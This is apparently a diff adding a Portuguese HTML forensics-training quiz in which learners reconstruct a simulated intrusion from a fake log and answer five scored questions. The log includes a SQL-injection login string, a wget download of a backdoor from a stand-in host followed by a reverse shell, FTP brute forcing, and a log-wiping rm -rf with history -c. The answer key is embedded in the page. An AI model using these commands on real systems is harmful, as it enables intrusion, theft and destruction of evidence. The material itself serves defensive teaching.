@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Extreme Forensics: Operação Shadow</title>
+    <style>
+        :root { --danger: #ff4444; --success: #00c851; --info: #33b5e5; --bg: #0a0a0a; }
+        body { font-family: 'Courier New', monospace; background: var(--bg); color: #cfd8dc; padding: 20px; }
+        .case-file { max-width: 950px; margin: auto; background: #121212; border: 2px solid #333; border-radius: 8px; overflow: hidden; box-shadow: 0 0 30px rgba(0,0,0,0.7); }
+        .header { background: #1c1c1c; padding: 20px; border-bottom: 2px solid var(--danger); text-align: center; }
+        .header h1 { margin: 0; color: var(--danger); letter-spacing: 4px; }
+        
+        .content { padding: 30px; }
+        .log-terminal { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-size: 0.85rem; margin-bottom: 25px; border: 1px solid #222; overflow-x: auto; }
+        
+        .question-block { background: #1a1a1a; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #444; transition: 0.3s; }
+        .question-block:hover { border-left-color: var(--info); background: #222; }
+        .question-block h3 { margin-top: 0; color: var(--info); font-size: 1rem; }
+        
+        select { width: 100%; padding: 10px; background: #000; color: #fff; border: 1px solid #444; border-radius: 4px; margin-top: 10px; }
+        
+        .btn-analyze { width: 100%; padding: 20px; background: var(--danger); color: white; border: none; font-weight: bold; font-size: 1.2rem; cursor: pointer; text-transform: uppercase; }
+        .btn-analyze:hover { background: #cc0000; }
+
+        #final-report { margin-top: 20px; padding: 25px; border-radius: 8px; display: none; line-height: 1.8; }
+        .rank-master { border: 2px solid var(--success); color: var(--success); background: rgba(0, 200, 81, 0.1); }
+        .rank-noob { border: 2px solid var(--danger); color: var(--danger); background: rgba(255, 68, 68, 0.1); }
+        .evidence-tag { background: #333; padding: 2px 6px; border-radius: 3px; font-size: 0.8rem; color: var(--accent); }
+    </style>
+</head>
+<body>
+
+<div class="case-file">
+    <div class="header">
+        <h1>TOP SECRET: INCIDENT REPORT #99X</h1>
+        <small>INVESTIGAÇÃO DE INTRUSÃO DE ALTA COMPLEXIDADE</small>
+    </div>
+
+    <div class="content">
+        <p><strong>CONTEXTO:</strong> O servidor <code>SRV-WEB-01</code> da empresa de Logística foi invadido. Dados de clientes foram vazados. Você recebeu os logs brutos para reconstruir o crime.</p>
+        
+        <div class="log-terminal">
+            [02:45:12] - INBOUND: POST /login.php HTTP/1.1 | User: ' OR 1=1 -- | Status: 200<br>
+            [02:50:44] - CMD: wget http://evil-repo.com/backdoor.py -O /tmp/sys_update.py<br>
+            [02:51:10] - CMD: python3 /tmp/sys_update.py --start-reverse-shell 443<br>
+            [03:05:22] - FTP: Connection from 192.168.1.50 (Internal HR Server)<br>
+            [03:05:30] - FTP: Brute Force Attempt - User 'manager' - 890 tries in 30s<br>
+            [03:06:01] - FTP: Login Successful - User 'manager' - Pass 'Manager2024'<br>
+            [03:10:00] - CMD: rm -rf /var/log/apache2/* && history -c
+        </div>
+
+        <div class="question-block">
+            <h3>Fase 1: O Ponto de Entrada</h3>
+            <p>Analisando o log das 02:45:12, como o atacante conseguiu burlar o login inicial do portal administrativo?</p>
+            <select id="q1">
+                <option value="">Escolha uma análise...</option>
+                <option value="wrong">Ele usou uma senha padrão de fábrica</option>
+                <option value="correct">Explorou SQL Injection para validar uma query falsa como verdadeira</option>
+                <option value="wrong">Enviou um arquivo infectado via formulário de contato</option>
+            </select>
+        </div>
+
+        <div class="question-block">
+            <h3>Fase 2: Persistência e Execução</h3>
+            <p>Após entrar, o atacante executou comandos às 02:50. O que aconteceu tecnicamente ali?</p>
+            <select id="q2">
+                <option value="">Escolha uma análise...</option>
+                <option value="correct">Download de script malicioso e estabelecimento de Reverse Shell (C2)</option>
+                <option value="wrong">Atualização legítima do sistema operacional via repositório Python</option>
+                <option value="wrong">Instalação de um antivírus para camuflar sua presença</option>
+            </select>
+        </div>
+
+        <div class="question-block">
+            <h3>Fase 3: Movimentação Lateral</h3>
+            <p>O atacante não parou no servidor web. O que os logs das 03:05 indicam sobre o próximo alvo?</p>
+            <select id="q3">
+                <option value="">Escolha uma análise...</option>
+                <option value="wrong">Ele tentou derrubar o firewall com um ataque DDoS</option>
+                <option value="correct">Ele usou o servidor web como pivô para atacar o Servidor de RH via FTP</option>
+                <option value="wrong">Ele enviou e-mails de phishing para todos os funcionários</option>
+            </select>
+        </div>
+
+        <div class="question-block">
+            <h3>Fase 4: Falha de Política</h3>
+            <p>Qual foi a vulnerabilidade crítica que permitiu o sucesso do ataque ao segundo servidor (RH)?</p>
+            <select id="q4">
+                <option value="">Escolha uma análise...</option>
+                <option value="wrong">O servidor de RH estava sem patches de segurança de 2026</option>
+                <option value="wrong">A porta FTP estava fechada, forçando o atacante a usar SSH</option>
+                <option value="correct">Senha previsível (Manager2024) e falta de bloqueio de tentativas (Rate Limiting)</option>
+            </select>
+        </div>
+
+        <div class="question-block">
+            <h3>Fase 5: Anti-Forense</h3>
+            <p>Qual foi a última ação do atacante documentada às 03:10:00?</p>
+            <select id="q5">
+                <option value="">Escolha uma análise...</option>
+                <option value="correct">Apagar rastros (Anti-forensics) deletando logs e histórico de comandos</option>
+                <option value="wrong">Criptografar os dados para pedir resgate (Ransomware)</option>
+                <option value="wrong">Reiniciar o servidor para aplicar as configurações de backdoor</option>
+            </select>
+        </div>
+
+        <button class="btn-analyze" onclick="generateReport()">Gerar Relatório Final de Perícia</button>
+
+        <div id="final-report"></div>
+    </div>
+</div>
+
+<script>
+    function generateReport() {
+        const answers = [
+            document.getElementById('q1').value,
+            document.getElementById('q2').value,
+            document.getElementById('q3').value,
+            document.getElementById('q4').value,
+            document.getElementById('q5').value
+        ];
+
+        const score = answers.filter(a => a === "correct").length;
+        const report = document.getElementById('final-report');
+        report.style.display = "block";
+
+        if (score === 5) {
+            report.className = "rank-master";
+            report.innerHTML = `
+                <h2>🏆 STATUS: PERITO MASTER (5/5)</h2>
+                <p>Análise impecável. Você mapeou toda a <strong>Cyber Kill Chain</strong> deste incidente. 
+                O atacante seguiu o fluxo: Exploração Web -> Comando e Controle -> Movimentação Lateral -> Exfiltração -> Evasão. 
+                O relatório será encaminhado para a diretoria imediatamente.</p>
+            `;
+        } else {
+            report.className = "rank-noob";
+            report.innerHTML = `
+                <h2>⚠️ STATUS: ANALISTA EM TREINAMENTO (${score}/5)</h2>
+                <p>Sua perícia contém lacunas. O atacante conseguiu ocultar alguns passos de você. 
+                Reveja os logs: observe que comandos como <code>history -c</code> e <code>rm -rf /var/log/</code> são sinais claros de limpeza de rastros.</p>
+                <button onclick="location.reload()" style="background:none; border:1px solid red; color:red; cursor:pointer;">Reiniciar Investigação</button>
+            `;
+        }
+    }
+</script>
+
+</body>
+</html>
